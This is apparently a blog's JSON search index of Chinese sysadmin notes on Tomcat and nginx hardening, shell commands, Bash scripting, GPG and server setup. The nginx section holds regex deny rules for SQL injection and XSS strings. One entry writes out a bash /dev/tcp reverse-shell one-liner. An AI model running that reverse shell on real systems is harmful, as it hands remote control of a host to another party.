[{"categories":["other"],"content":"又一天过去了，今天过得怎么样，梦想是不是更远了？","date":"2022-06-22","objectID":"/posts/starting/","tags":["other"],"title":"Starting","uri":"/posts/starting/"},{"categories":["other"],"content":" 第一篇文章当然是hello world了 echo \"hello world !\" ","date":"2022-06-22","objectID":"/posts/starting/:0:0","tags":["other"],"title":"Starting","uri":"/posts/starting/"},{"categories":["linux","运维记事"],"content":"常用web环境优化","date":"2020-11-18","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/","tags":["linux","优化","nginx","php","解决方案"],"title":"常用web环境优化","uri":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/"},{"categories":["linux","运维记事"],"content":" 前言 一篇包含tomcat、nginx、php等相关参数及性能的优化文件，看了很多，但却不能完全记住，整理一篇用于备忘。 1. tomcat 服务调优 tomcat: 8.5.59 1.1. 安全优化 降权启动 新建普通用户，切换到普通用户，启动tomcat telnet管理端口保护 修改配置文件/pathto/tomcat/conf/server.xml,22行左右的\u003cServer port=\"8005\" shutdown=\"SHUTDOWN\"\u003e 8005端口和SHUTDOWN(区分大小写)关键字,防止tomcat被远程关闭 ajp 连接端口保护 ajp 是apache和tomcat相互沟通的一个渠道，如果不使用，可以注释掉或者修改端口 /pathto/tomcat/conf/server.xml: 123 。 禁用管理端 一般管理端用于测试使用,正式使用需要删除/pathto/tomcat/webapps下所有目录,新建的站点放到该目录的ROOT下即可,另删除/pathto/tomcat/conf/tomcat-users.xml下关于角色的配置(或者删掉这个文件,似乎也没有什么影响)。 文件访问列表控制 web.xml: 121 配置listings值为false， 默认false 隐藏版本信息 可修改conf/web.xml中关于error-page的相关配置(实际上个人在5.8中好像没有找到这块的),也可以修改站点中WEB-INF/web.xml中的错误页 访问控制限制 conf/server.xml: Host 下添加\u003cValve className=\"org.apache.catalina.valves.RemoteAddrValve\" allow=\"10.0.2.*\"/\u003e 启动脚本权限修正744 应用自动部署 conf/server.xml: 158 修改参数unpackWARs和autoDeploy: \u003cHost name=\"localhost\" appBase=\"webapps\" unpackWARs=\"false\" autoDeploy=\"false\"\u003e 1.2. 性能优化 屏蔽dns查询 enableLookups=\"false\": 69 : /pathto/tomcat/conf/server.xml(配置默认端口那儿) jvm 调优 JAVA_OPTS=根据监控协调参数。 启用nio2(conf/server.xml) Nio2启用后zabbix带有的模板监控会出现大量的监控项无效，Object or attribute not found. 此问题暂时还未找到解决方案 \u003cConnector executor=\"tomcatThreadPool\" port=\"8080\" enableLookups=\"false\" protocol=\"org.apache.coyote.http11.Http11Nio2Protocol\" connectionTimeout=\"20000\" redirectPort=\"8443\" /\u003e 2. tmpfs 一种基于内存的文件系统 可用于挂载临时文件存放目录,挂载后操作目录相当于直接操作内存，umount后挂载目录数据会被直接清空。 mount -t tmpfs -o size=1024M tmpfs /mnt/usb02 3. nginx 优化 nginx 规则匹配优先级: = \u003e 完整路径 \u003e ^~ \u003e ~|~* \u003e 部分起始路径 \u003e / 防止SQL注入、XSS攻击的实践配置方法 if ($request_method !~* GET|POST) { return 444; } #使用444错误代码可以更加减轻服务器负载压力。 if ($query_string ~* \"(\\$|'|--|[+|(%20|%2F)]union[+|(%20|%2F)]|[+|(%20|%2F)]insert[+|(%20|%2F)]|[+|(%20|%2F)]drop[+|(%20|%2F)]|[+|(%20|%2F)]truncate[+|(%20|%2F)]|[+|(%20|%2F)]update[+|(%20|%2F)]|[+|(%20|%2F)]from[+|(%20|%2F)]|[+|(%20|%2F)]grant[+|(%20|%2F)]|[+|(%20|%2F)]exec[+|(%20|%2F)]|[+|(%20|%2F)]where[+|(%20|%2F)]|[+|(%20|%2F)]select[+|(%20|%2F)]|[+|(%20|%2F)]and[+|(%20|%2F)]|[+|(%20|%2F)]or[+|(%20|%2F)]|[+|(%20|%2F)]count[+|(%20|%2F)]|[+|(%20|%2F)]exec[+|(%20|%2F)]|[+|(%20|%2F)]chr[+|(%20|%2F)]|[+|(%20|%2F)]mid[+|(%20|%2F)]|[+|(%20|%2F)]like[+|(%20|%2F)]|[+|(%20|%2F)]iframe[+|(%20|%2F)]|[\\\u003c|%3C]script[\\\u003e|%3E]|javascript|alert|webscan|dbappsecurity|style|confirm\\(|innerhtml|innertext)(.*)$\") { return 555; } if ($uri ~* \"(/~).*\") { return 501; } if ($uri ~* \"(\\\\x.)\") { return 501; } if ($query_string ~* \"[;'\u003c\u003e].*\") { return 509; } if ($request_uri ~ \" \") { return 509; } if ($request_uri ~ \"(\\/\\.+)\") { return 509; } if ($request_uri ~ \"(\\.+\\/)\") { return 509; } # sql 注入 # if ($uri ~* \"(insert|select|delete|update|count|master|truncate|declare|exec|\\*|\\')(.*)$\" ) { return 508; } if ($query_string ~ \"concat.*\\(\") { return 508; } if ($query_string ~ \"union.*select.*\\(\") { return 508; } if ($query_string ~ \"union.*all.*select.*\") { return 508; } if ($request_uri ~* \"(cost\\()|(concat\\()\") { return 508; } if ($request_uri ~* \"[+|(%20|%2F)]union[+|(%20|%2F)]\") { return 508; } if ($request_uri ~* \"[+|(%20|%2F)]and[+|(%20|%2F)]\") { return 508; } if ($request_uri ~* \"[+|(%20|%2F)]select[+|(%20|%2F)]\") { return 508; } if ($request_uri ~* \"[+|(%20|%2F)]or[+|(%20|%2F)]\") { return 508; } if ($request_uri ~* \"[+|(%20|%2F)]delete[+|(%20|%2F)]\") { return 508; } if ($request_uri ~* \"[+|(%20|%2F)]update[+|(%20|%2F)]\") { return 508; } if ($request_uri ~* \"[+|(%20|%2F)]insert[+|(%20|%2F)]\") { return 508; } ## 常见漏洞利用 if ($query_string ~ \"(\u003c|%3C).*script.*(\u003e|%3E)\") { return 403; } if ($query_string ~ \"GLOBALS(=|\\[|\\%[0-9A-Z]{0,2})\") { return 403; } if ($query_string ~ \"_REQUEST(=|\\[|\\%[0-9A-Z]{0,2})\") { return 403; } if ($query_string ~ \"proc/self/environ\") { return 403; } if ($query_string ~ \"mosConfig_[a-zA-Z_]{1,21}(=|\\%3D)\") { return 403; } if ($query_string ~ \"base64_(en|de)code\\(.*\\)\") { return 403; } # 垃圾邮件字段 if ($query_string ~ \"\\b(ultram|unicauca|valium|viagra|vicodin|xanax|ypxaieo)\\b\") { return 507; } if ($query_string ~ \"\\b(erections|hoodia|huronriveracres|impotence|levitra|libido)\\b\") { retur","date":"2020-11-18","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/:0:0","tags":["linux","优化","nginx","php","解决方案"],"title":"常用web环境优化","uri":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/"},{"categories":["linux","运维记事"],"content":"收集了一些常用和有趣的命令","date":"2019-07-23","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/","tags":["linux","解决方案"],"title":"常用命令收集","uri":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/"},{"categories":["linux","运维记事"],"content":"引入一个更为专业的命令收集站点 : https://www.commandlinefu.com/commands/browse 统计第一列相同，第二列平均值 cat xxx |awk '{a[$1]+=$2;c[$1]++}END{l=asorti(a,b);for(i=1;i\u003c=l;i++)print b[i],a[b[i]]/c[b[i]]}' 时间段统计日志： sed -n '/2018:02:30/,/2018:03:00/p' www.log |awk '{a[$1]+=1;} END {for(i in a){print a[i]\" \"i;}}' |sort -t \" \" -k 1 -n sed -n '/2018:01:50/,/2018:02:00/p' www.log |grep \"list?\" |awk '{a[$1]+=1;} END {for(i in a){print a[i]\" \"i;}}' |sort -t \" \" -k 1 -n 按照 ip 排序 # 升序 sort -t'.' -k1,1n -k2,2n -k3,3n -k4,4n ip.txt # 降序 sort -t'.' -k1,1nr -k2,2nr -k3,3nr -k4,4nr ip.txt shell 中获取脚本绝对路径 SHELL_DIR=$(dirname $(readlink -f \"$0\")) SHELL_DIR=$(cd `dirname $0`; pwd) tailf 显示高亮 tail -f www.log | perl -pe 's/(\\/pattern1\\/pattern2)/\\e[1;31m$1\\e[0m/g' tail -f www.log |grep --color -E 'pattern|$' openssl 通过证书加密解密大文件 mkdir /etc/encrypt \u0026\u0026 cd /etc/encrypt openssl genrsa -out private.pem 2048 openssl rsa -in private.pem -outform PEM -pubout -out public.pem openssl rand -base64 32 \u003e key.bin # 远程传输建议每次都新建 # 加密 openssl rsautl -encrypt -pubin -inkey /etc/encrypt/public.pem -in /etc/encrypt/key.bin -out /etc/encrypt/key.bin.enc openssl aes-256-cfb -a -pbkdf2 -salt -in filename.gz -out filename.gz.enc -k $(cat /etc/encrypt/key.bin) # 解密 openssl rsautl -decrypt -inkey private.pem -in key.bin.enc -out key.bin openssl aes-256-cfb -d -a -pbkdf2 -in filename.gz.enc -out filename.gz -k $(cat key.bin) # 加密 tar -czf - * | openssl aes-256-cfb -salt -k \"8CASiU6zxAWy9QZ8wj+MgIzqHsBnXjgkHNvWeJ0urHw=\" -out ssh.key.pem.enc openssl aes-256-cfb -d -salt -in ssh.key.pem.enc -out ssh_key.pem.tar.gz 手动检测: 每分钟连接次数 netstat -ntu | awk '{print $5}' |cut -d: -f1|sort|uniq -c |sort -n netstat -an |grep ^tcp.*:80|egrep -v 'LISTEN|127.0.0.1'|awk -F\"[ ]+|[:]\" '{print $6}'|sort|uniq -c|sort -rn linux 用 tcpdump 查看 80 端口访问有哪些 IP tcpdump -i eth0 -tnn dst port 80 -c 1000|awk -F\".\" '{print $1\".\"$2\".\"$3\".\"$4}'|sort|uniq -c|sort -rn|head -n20 查看 linux 内存占用最高的 10 个进程 ps aux|head -1 \u0026\u0026 ps aux|grep -v PID|sort -rn -k +4|head linux 查看 cpu 占用最高的 10 个进程 ps aux|head -1;ps aux|grep -v PID|sort -rn -k +3|head linux 查看命令来源于那个包(yum 也适用) dnf provides htop linux 查看已安装的命令原来于那个包 rpm -qf /usr/bin/htop linux 查看 rpm 包信息 rpm -qpi xxx.rpm linux 查看 rpm 包内容 rpm -qpl xxx.rpm linux 查看 rpm 包依赖 rpm -qpR xxx.rpm linux 查看 rpm 包带的执行脚本 rpm -qp --scripts xxx.rpm linux 自动安装 rpm 包依赖(dnf 默认已存在该功能) yum -y localinstall xxx.rpm linux rpm 循环安装包依赖 # 关于循环安装是指的是主rpm包的所有的依赖包在同一目录下，会自动安装其依赖后在安装主rpm包，(此方法缺陷较大) rpm -ivh --aid *.rpm 清除僵死进程 ps -eal | awk '{ if ($2 == \"Z\") {print $4}}' | kill -9 LNMP/LAMP 环境查看编译参数 # nginx /pathto/nginx/sbin/nginx -V # apache /pathto/apache/build/config.nice # mysql grep CONFIGURE_LINE /usr/bin/mysqlbug # php /pathto/php/bin/php -i|grep configure 让不同的进程使用不同的 cpu # taskset -c,--cpu-list command taskset -c 0,1,2,3 /etc/init.d/mysql start watch 监测命令运行结果 # 类似tailf,但是针对命令 # 查看当前目录内容变化 # watch ls # watch \"netstat -ntu | awk '{print $5}' |cut -d: -f1|sort|uniq -c |sort -n\" 创建一个具有特定权限的空文件 #install -b -m \u003c权限\u003e \u003c来源\u003e \u003c目标\u003e install -b -m 777 /dev/null file.txt 创建一个具有特定权限的目录 # install -d -o \u003c用户名\u003e -g \u003c用户组\u003e -m \u003c权限\u003e \u003c目标地址\u003e install -d -o www -g www -m 755 /run/php-fpm 通过 sshfs 远程挂载目录 yum install sshfs # mount sshfs -o reconnect,_netdev,user,idmap=user,identityfile=/pathto/id_rsa,default_permissions user@host:/path /mnt/pathto # /etc/fstab user@host:/path /mnt/pathto fuse.sshfs noauto,x-systemd.automount,reconnect,_netdev,user,idmap=user,identityfile=/pathto/id_rsa,allow_other,default_permissions 0 0 tmpfs 一种基于内存的文件系统 mount -t tmpfs -o size=1024M tmpfs /mnt/usb02 文件描述符相关 点击展开详细内容 系统最大打开的文件描述符数量 cat /proc/sys/fs/file-nr 10848 0 6815744 # 第一个值: 当前系统已分配使用的打开文件描述符数 # 第二个值: 为分配后已释放的（目前已不再使用） # 第三个值: 等于/proc/sys/fs/file-max(打开的最大fd数量) 获取打开的文件数量 获取整个系统打开的文件数量 lsof | wc -l 获取某个用户打开的文件数量 lsof -u test |wc -l 获取某个程序打开的文件数量 for i in `pidof dotnet`; do lsof -p \"$i\" | wc -l ; done 获取某个程序打开的文件描述符数量 for i in `pidof dotnet` ; do echo -n \"$i : \"$(ll /proc/$i/fd|wc -l) done 查看系统里占用 fd 最多的进程 lsof -n | awk '{print $2}' | sort | uniq -c | sort -nr |head -n 10 #第一","date":"2019-07-23","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/:0:0","tags":["linux","解决方案"],"title":"常用命令收集","uri":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/"},{"categories":["linux","运维记事"],"content":"Shellscript相关","date":"2019-05-31","objectID":"/posts/linux/shellscript%E7%9B%B8%E5%85%B3/","tags":["linux","shellscript"],"title":"Shellscript相关","uri":"/posts/linux/shellscript%E7%9B%B8%E5%85%B3/"},{"categories":["linux","运维记事"],"content":"1. shell 脚本执行的几种方法 bash(sh) /path/script.sh 赋予执行权限 /path/script.sh 或 ./scripts.sh source script.sh 或 . script.sh 在此方法中执行,子 shell 中定义的变量,可在父 shell 中调用(其他方式父 shell 不能直接调用子 shell 的变量) bash(sh) \u003c script.sh 或 cat script.sh | bash(sh) 2. shell 脚本规范 以 #!/bin/bash 或 #!/bin/sh 开头 注释标注, 作者、联系方式、时间、版本、脚本描述 脚本尽量不是使用中文注释 脚本以.sh 为扩展名 成对书写符号、条件控制语句等。如: []、{}、if []; then fi 3. 变量的设置与取消 设置 : 变量名=值 变量名一般大写 打印 : echo $变量名 取消 : unset 变量名 4. 变量定义 4.1. 普通变量定义 变量名=value 变量名='value' 变量名=\"value\" 变量名=$(ls) 变量名=`ls` 4.2. 变量名定义要求 变量名一般由字母、数字、下划线组成 4.3. 示例 a=123 b=123-$a ## 当值没有单(双)引号的时候,变量的值为 123-变量 a 的值,若变量值出现空格，则值为第一个空格之前的数据 c='123-$a' ## 当值存在单引号的时候,值为什么，打印结果则为什么，引号内内容视为一个整体 d=\"123-$a\" ## 当值为双引号的时候,若值中存在变量、命令(需要转义)等，会优先把变量、命令结果输出,在打印所有值 5. 特殊、内置变量 变量名 说明 $0 获取当前执行脚本的名称,如果执行脚本带有路径,则包含脚本路径 $n 获取当前执行脚本的第 n 个参数,n=1-9，n 为 0 时,表示脚本文件名,如果 n 大于 9,用大括号括起来${10},参数以空格隔开 $* 获取当前脚本所有传入的参数,将所有的参数视为单个字符串,相当于\"$1$2$3\"… $# 获取当前脚本传入参数的个数总数 $@ 获取当前脚本所有传入参数,将所有的参数分别传入至其他变量或脚本(获取脚本最后一个参数:${@: -1} $? 确定上一个指令的返回值，0 成功, 非 0 不成功 2: 权限拒绝 ; 1-125: 运行失败,参数传递错误 ; 126: 找到该命令,但无法执行 ; 127:未找到运行的命令 ; 128: 命令被强行中断 ; 脚本中一般用exit 0 , 在执行脚本,返回值给$?, 函数中一般用return 返回值给$? $$ 当前脚本执行的进程号 $! 获得之前(上一个)进程 ID $_ 上一条命令的最后一个参数 $PPID 父进程的进程 ID $PS1 主提示符串，默认值是$ $* 和 $@ 的示例: [root@00 ~]# set -- hello my \"linux shell\" [root@00 ~]# echo $# 3 [root@00 ~]# echo $1 hello [root@00 ~]# echo $2 my [root@00 ~]# echo $3 linux shell [root@00 ~]# for i in \"$@\"; do echo $i;done hello my linux shell [root@00 ~]# for i in \"$*\"; do echo $i;done hello my linux shell 6. 常用操作表达式 表达式 说明 ${#string} 返回$string的长度 ${string:position} 在$stirng中,从$position之后开始提取子串 ${string:position:length} 在$string,从位置$position之后开始提取长度为$length的子串 ${string#substring} 从变量$string开头开始删除最短匹配$substring的子串 ${string##substring} 从变量$string开头开始删除最长匹配$substring的子串 ${string%substring} 从变量$string结尾开始删除最短匹配$substring的子串 ${string%%substring} 从变量$string结尾开始删除最长匹配$substring的子串 ${string/pattern/parameter} 在变量string中,使用parameter替换pattern匹配的第一个值 ${string//pattern/parameter} 在变量string中,使用parameter替换所有pattern匹配的值 ${string/#pattern/parameter} 在变量string中,使用parameter替换以pattern开头的值 ${string/%pattern/parameter} 在变量string中,使用parameter替换以pattern结尾的值 7. 变量替换表 运算符号 替换 ${value:-word} 如果变量value存在且非null，则返回变量的值,否则,返回word字符串. 例: res=${value:-word},如果value未定义,则res的值为word ${value:=word} 如果变量value存在且非null，则返回变量的值,否则,则设置这个变量值为word. 例: res=${value:=word},如果value未定义,则res的值为word,value值也为word ${value:+word} 如果value存在且非null,则返回word,否则返回null.例res=${value:+word},如果value已经定义, 则res的值为word,如果value值未定义,则res值为null(空) ${value:?message} 如果变量value存在且非null，则返回变量value的值，否则返回信息bash: value: message,例 echo ${value:?is null},如果value值已定义，则返回value定义值,否者返回 bash: value: is null,退出状态码为1 8. 常见的运算符 在Shell脚本中，[]和[[]]都用于条件测试，但它们之间存在一些重要的差异 兼容性：[]是POSIX标准的测试语句，因此它在所有POSIX兼容的shell中都可以使用，包括bash、dash、ksh等。而[[]]是bash的扩展，只能在bash和一些兼容bash的shell中使用，如zsh。 排序：在[[]]中，你可以使用\u003c和\u003e来比较字符串的字典序。例如，[[ \"abc\" \u003c \"def\" ]]会返回真。而在[]中，这样的比较会导致语法错误。 逻辑操作符：在[]中，你需要使用-a和-o来表示逻辑与和逻辑或。例如，[ \"$a\" -eq 1 -a \"$b\" -eq 2 ]。而在[[]]中，你可以使用更直观的\u0026\u0026和||。例如，[[ \"$a\" -eq 1 \u0026\u0026 \"$b\" -eq 2 ]]。 字符串匹配：在[[]]中，==右边的字符串会被视为模式，而在[]中，它只是一个普通的字符串。例如，[[ \"$a\" == a* ]]会检查$a是否以a开头，而[ \"$a\" == a* ]会检查$a是否等于字符串a*。 正则匹配：[[]]支持使用=~进行正则表达式匹配。例如，[[ \"$a\" =~ ^a.* ]]会检查$a是否以a开头。而[]不支持正则表达式。 变量引用：在[]中，如果一个变量未定义，那么它会被视为一个空字符串，除非你用双引号引起来。例如，如果$a未定义，那么[ $a == \"\" ]会导致语法错误，而[ \"$a\" == \"\" ]则不会。而在[[]]中，即使变量未定义，也不需要引号。 8.1. 变量运算符 运算符 说明 ++ -- 自增与自减; 符号在前代表先运算在赋值，符号在后代表先赋值在运算 - + - ! ~ - - * / % 乘、除、模 / 取整 ; % 取余 + - 加、减 - \u003c \u003c= \u003e \u003e= 小于、小于等于、大于、大于等于 - == != =~ 等于、不等于、正则匹配符 [[ $VAR =~ ^[a-zA-Z] ]],正则不可用引号括起来,变量可单双引号 \u003c\u003c \u003e\u003e 位运算: 左移、右移 二进制计算 \u0026\u0026 逻辑的 and true \u0026\u0026 false ,结果 false ` ` = += -= *= /= %= 赋值运算 (a+=b) == (a=a+b); 其他同理 ** 幕运算 2**3=8 8.2. 算术运算符 字符串比较运算符(建议在(())和[[]]中使用的) 算术运算符(建议在[]以及test中使用的) 说明 ==或= -eq 检测 2 个数是否相等，相等返回true != -ne 检测 2 个数是否不相等，相等返回true \u003e -gt 检测左边的数是否大于右边的，如果是，则返回true \u003e= -ge 检测左边的数是否大于等于右边的，如果是，则返回true \u003c -lt 检测左边的数是否小于右边的，如果是，则返回true \u003c= -le 检测左边的数是否小于等于右边的，如果是，则返回true 8.3. 逻辑运算符 运算符(建议在[[]]中使用) 运算符(建议在[]和test中使用) 说明 ! ! 非运算，表达式为true，则返回false，否则返回true; 例: [!false]返回true || -o 或运算，有一个表","date":"2019-05-31","objectID":"/posts/linux/shellscript%E7%9B%B8%E5%85%B3/:0:0","tags":["linux","shellscript"],"title":"Shellscript相关","uri":"/posts/linux/shellscript%E7%9B%B8%E5%85%B3/"},{"categories":["linux","运维记事"],"content":"那些杂七杂八的记录(一)","date":"2021-08-04","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/","tags":["linux","解决方案"],"title":"那些杂七杂八的记录(一)","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/"},{"categories":["linux","运维记事"],"content":"GnuPG 加密与解密 gpg 对称加密 加密: gpg -c \u003cfile\u003e， 输入两次加密密码，完成后生成文件\u003cfile\u003e.gpg(加密后源文件保留) 解密: gpg \u003cfile\u003e.gpg, 输入加密密码,正确后生成文件\u003cfile\u003e(解密后加密文件保留) gpg 非对称加密 非对称加密/解密文件时，Server 生成私钥与公钥，并把公钥发送给Client, Client 使用公钥加密数据，并把加密后的数据传给Server ，Server 最后使用自己的私钥解密数据。 # Server: 创建公钥私钥 $\u003e gpg --gen-key # 需要填写一些东西，可根据需求选择 ## 配置文件介绍 # GPG 配置文件目录:~/.gnupg # ~/.gnupg/gpg.conf – 配置文件 # ~/.gnupg/trustdb.gpg – 信任库 # ~/.gnupg/pubring.gpg – 公钥库 # ~/.gnupg/secring.gpg – 私钥库 $\u003e gpg --list-key # 密钥查看 $\u003e gpg -a --export \u003cUserID\u003e \u003e ./public-key.pub # Server: 公钥导出 UserID 为公私钥创建时候生成的，即 gpg: 密钥 \u003cUserID\u003e 被标记为绝对信任 # 将公钥传送到Client上 # Client: 导入 公钥 $\u003e gpg --import ./public-key.pub # Client: 文件加密 $\u003e gpg -e -r \u003cUserID\u003e \u003cfile\u003e \u003cfile\u003e.gpg # 加密完成后将文件传送至Server 进行解密，此时Client上是不可解密的，要解密需要私钥 # Server: 文件解密 $\u003e gpg -d \u003cfile\u003e.gpg \u003cfile\u003e DOCKER 创建 DNS SERVER $\u003e vim /data/docker/dns/dnsmasq.conf #dnsmasq config, for a complete example, see: # http://oss.segetech.com/intra/srv/dnsmasq.conf #log all dns queries log-queries #dont use hosts nameservers no-resolv #use cloudflare as default nameservers, prefer 1^4 server=8.8.4.4 server=8.8.8.8 strict-order #serve all .company queries using a specific nameserver server=/company/10.0.0.1 #explicitly define host-ip mappings address=/www.example.com/172.16.10.10 $\u003e docker run -d -p 53:53/udp -p 53:53/tcp -p 5380:8080 -v /data/docker/dns/dnsmasq.conf:/etc/dnsmasq.conf --log-opt \"max-size=100m\" -e \"HTTP_USER=root\" -e \"HTTP_PASS=root\" jpillora/dnsmasq dotnet 环境搭建 $\u003e rpm -Uvh https://packages.microsoft.com/config/rhel/7/packages-microsoft-prod.rpm $\u003e yum install libgdiplus-devel libunwind icu -y $\u003e wget https://packages.microsoft.com/rhel/7/prod/dotnet-sdk-2.1.200-rhel-x64.rpm $\u003e yum install dotnet-sdk-2.1.200-rhel-x64.rpm -y $\u003e dotnet --info # supervisor 管理 https://blog.0x5c0f.cc/2019/supervisor%E6%89%B9%E9%87%8F%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86 yum install supervisor -y # 前端管理样式页面 /usr/lib/python2.7/site-packages/supervisor/ui/status.html 在Linux中删除virbr0接口 virbr0是CentOS7在安装过程中选择了相关虚拟化的服务安装后产生的,实际上好像是没什么卵用的 $\u003e virsh net-list $\u003e virsh net-destroy default $\u003e virsh net-undefine default $\u003e systemctl restart libvirtd.service Linux 杀毒软件 clamav # 需要安装epel源 $\u003e　yum install clamav-server clamav-data clamav-update clamav-filesystem clamav clamav-scanner-systemd clamav-devel clamav-lib clamav-server-systemd # 注释掉 /etc/freshclam.conf /etc/clamd.d/scan.conf 中的Example # 更新病毒库　$\u003e /usr/bin/freshclam # 扫描 $\u003e clamscan -ri /data --remove -l /var/log/clamscan.log linux 合并文件系统 margerfs https://wzyboy.im/post/1148.html https://github.com/trapexit/mergerfs 使用示例: # 挂载到的目录必须为空 # 命令挂载 $\u003e mergerfs -o defaults,allow_other,use_ino,minfreespace=10G,ignorepponrename=true /data01:/data02 /shares # fstab $\u003e /etc/fstab /data01:/data02 /shares fuse.mergerfs defaults,noauto,allow_other,use_ino,minfreespace=10G,ignorepponrename=true 0 0 linux sftp 搭建 # 编辑文件 /etc/ssh/sshd_config,末尾添加(新建的用户若仅使用sftp可以不指定可登陆的bash) # 若想要让sftp更像登陆到了服务器,可配合chroot来控制,当然也可以直接创建账号，但一般不建议 # Match Group/User www # 限制某个组或者某个用户使用以下规则 # 仅允许使用sftp , -l INFO 表示记录 SFTP 的 INFO 级别日志。-f AUTH 指定 SFTP 鉴权日志级别为 AUTH ForceCommand internal-sftp -l INFO -f AUTH # 禁止使用密码进行身份验证，只允许通过公钥认证 PasswordAuthentication no # 禁止 SSH 隧道功能 PermitTunnel no # 禁止 SSH 代理转发 AllowAgentForwarding no # 禁止 TCP 转发 AllowTcpForwarding no 监听本地网卡上没有的IP地址 # 一般用于 keepalive + nginx 使用 echo 'net.ipv4.ip_nonlocal_bind = 1' \u003e\u003e /etc/sysctl.conf 腾讯云第二块网卡绑定公网ip 官方文档是有记录的，这儿记录下服务器上的设置 # 网卡初始化 DEVICE=eth1 NM_CONTROLLED=yes ONBOOT=yes IPADDR=\u003c网卡2IP\u003e NETMASK=255.255.240.0 # echo \"10 t1\" \u003e\u003e /etc/iproute2/rt_tables echo \"20 t2\" \u003e\u003e /etc/iproute2/rt_tables /usr/sbin/ip route add default dev eth0 via 172.21.0.1 table 10 /usr/sbin/ip route add default dev eth1 via 172.21.0.1 table 20 /usr/sbin/ip rule add from 172.21.2.168 table 10 /usr/sbin/ip rule add from 172.21.2.74 table 20 shell 反弹 https://blog.csdn.net/weixin_41082546/article/details/104123131 # 被控端执行 nc -lvp 65535 # 控制端执行 bash -i \u003e\u0026 /dev/tcp/\u003c被控端ip\u003e/65535 0\u003e\u00261 nginx 获取cdn真实用户ip # client_real_ip 即为用户真实IP,可直接用于替换 remote_addr m","date":"2021-08-04","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/:0:0","tags":["linux","解决方案"],"title":"那些杂七杂八的记录(一)","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/"},{"categories":["linux","运维记事"],"content":"那些杂七杂八的记录(二)","date":"2021-08-04","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.2/","tags":["linux","解决方案"],"title":"那些杂七杂八的记录(二)","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.2/"},{"categories":["linux","运维记事"],"content":"debian 12 下 ROOTN 用户，无法设置中文问题 具体体现是，系统无论如何设置，终端变量始终为 LANG=C 和 LANGUAGE=C, 检查了所有设置，最后发现在~/.profile中，设置了这两个变量，不知道为什么要这样干，删了重载下就可以了 debian 系统下， vim 打开文件后鼠标选择为可视模式问题 全局修改: 编辑 /usr/share/vim/vim82/defaults.vim , 大概在 80 行: if has('mouse') 下，将 set mouse=a 改为 set mouse= 即可 nginx 添加 ssl 证书后 ， 浏览器仍然提示 不安全(你与此网站之间建立的连接并非完全安全) 多数是因为混合内容，在网站页面文件中,包含了其他网站非https的资源 共享一个我自己用的 Bash Prompt # ~/.bashrc # need expand scripts: add https://github.com/git/git/blob/master/contrib/completion/git-prompt.sh to profile.d _PS1_CMD_=\"\\${VIRTUAL_ENV_PROMPT}\\\\\\\\[\\\\\\\\][\\\\[\\$(tput sgr0)\\\\]\\\\[\\\\033[38;5;5m\\\\]\\\\u\\\\[\\$(tput sgr0)\\\\]@\\\\[\\$(tput sgr0)\\\\]\\\\[\\\\033[38;5;70m\\\\]\\\\h\\\\[\\$(tput sgr0)\\\\] \\\\W]\\\\[\\$(tput sgr0)\\\\]\\\\[\\\\033[38;5;77m\\\\]\\${__GIT_BRANCH__}\\\\[\\\\033[38;5;9m\\\\][\\\\\\$?]\\\\[\\$(tput sgr0)\\\\]\\\\\\\\\\$ \\\\[\\$(tput sgr0)\\\\]\" export PROMPT_COMMAND=\"${PROMPT_COMMAND}; __GIT_BRANCH__=\\\"\\$(__git_ps1 '(%s)')\\\"; PS1=\\\"${_PS1_CMD_}\\\"\" # export PS1=\"[\\[$(tput sgr0)\\]\\[\\033[38;5;5m\\]\\u\\[$(tput sgr0)\\]@\\[$(tput sgr0)\\]\\[\\033[38;5;70m\\]\\h\\[$(tput sgr0)\\] \\W]\\[$(tput sgr0)\\]\\[\\033[38;5;9m\\][\\$?]\\[$(tput sgr0)\\]\\\\$ \\[$(tput sgr0)\\]\" windows 系统中代理设置问题 系统设置中, 默认代理设置使用的是 http 模式，如果想要使用 socks模式，则在地址栏输入 socks=\u003cproxy_ip\u003e，端口为socks端口即可(socks模式仅在win11上进行测试，其他系统参考执行) windows 挂载 sshfs 方法 本方案看到别人成功过，但自己没有测试成功 安装以下内容, 打开 sshfs-win-manager 正常配置挂载: https://github.com/winfsp/winfsp https://github.com/winfsp/sshfs-win https://github.com/evsar3/sshfs-win-manager Proxmox VE 中使用 Cloud 系统镜像快速创建虚拟机 https://www.truenasscale.com/2022/05/24/1117.html https://fairysen.com/742.html#toc-head-6 创建虚拟机, 操作系统设置，选择 不使用任何介质 系统 设置将 SCSI控制器 调整为 VirtIO SCSI, 机器可以设置为q35也可以默认 磁盘 